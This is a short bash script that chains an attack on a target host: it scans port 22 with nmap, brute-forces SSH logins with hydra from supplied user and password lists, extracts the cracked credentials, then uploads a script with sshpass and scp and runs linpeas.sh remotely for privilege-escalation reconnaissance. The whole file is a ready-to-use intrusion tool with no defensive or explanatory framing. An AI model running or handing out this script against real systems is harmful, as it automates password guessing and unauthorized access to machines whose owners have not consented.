#!/bin/bash

NMAP=$(nmap $1 -p22)
if echo "$NMAP" | grep "ssh" &> /dev/null
then
	echo "SSH service found ! Bruteforce executing..."
	HYDRA=$(hydra -I -L $2 -P $3 $1 ssh)
	if echo "$HYDRA" | grep "[22]" &> /dev/null
	then
		RESULT=$(echo "$HYDRA" | grep "[22]" | sed -n '4 p')
		USER=$(echo "$RESULT" | awk '{print $5}')
		PASS=$(echo "$RESULT" | awk '{print $7}')
		echo "Login found ! Sending script..."
		ssh-keyscan $1 >> ~/.ssh/known_hosts
		sshpass -p $PASS scp $4 $USER@$1:/home/user/
		echo "Script sent ! Executing script..."
		sshpass -p $PASS ssh $USER@$1 './linpeas.sh' | tee ./scan.txt
	fi
fi
